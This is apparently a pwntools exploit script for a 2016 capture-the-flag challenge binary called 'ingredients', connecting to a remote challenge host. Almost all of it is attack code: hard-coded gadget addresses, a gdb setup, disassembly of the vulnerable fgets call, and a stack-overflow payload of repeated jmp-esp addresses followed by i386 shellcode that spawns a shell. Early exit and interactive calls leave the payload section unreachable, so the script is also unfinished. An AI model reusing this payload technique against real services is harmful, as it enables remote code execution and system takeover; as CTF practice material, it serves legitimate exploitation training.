from pwn import *

context.terminal = 'urxvt'

buff = 0xfff407f0
ebp  = 0xfff40bf8
ret  = ebp + 4

g_handle_client = 0x804865f
g_leave_ret = 0x80485b8
g_fgets     = 0x80486c5
g_jmp_esp   = 0x8048679

f_fgets     = 0x80484a0

l_bss       = 0x804a370
l_stdin     = 0x804a060

MAX_LINE = 1024
MAX_INPUT = 256

"""

gdb.attach(p, '''
    b *{g_fgets}
    b *0x804880e
    disable 1
    c   
'''.format(**locals()))

"""

p = remote('ctf2016.the-playground.dk', 11001)
# p = process('./ingredients')
# p.interactive()

p.interactive()

exit(0)

p.sendline('a')
print 'Fill:', ret - buff
for _ in range(0, 512, 3):
    p.sendline('')

"""
   0x80486c5 <handle_client+102>:	mov    eax,ds:0x804a060
   0x80486ca <handle_client+107>:	mov    DWORD PTR [esp+0x8],eax
   0x80486ce <handle_client+111>:	mov    DWORD PTR [esp+0x4],0xff
   0x80486d6 <handle_client+119>:	lea    eax,[ebp-0x510]
   0x80486dc <handle_client+125>:	add    eax,0x8
   0x80486df <handle_client+128>:	mov    DWORD PTR [esp],eax
   0x80486e2 <handle_client+131>:	call   0x80484a0 <fgets@plt>
"""

p.sendline('end')
p.interactive()

pay = ''
pay += p32(g_jmp_esp) * (340 // 4)
pay += p32(g_jmp_esp)
pay += asm(shellcraft.i386.sh())

assert '\x00' not in pay

p.sendline(pay)
p.sendline('end')


p.interactive()
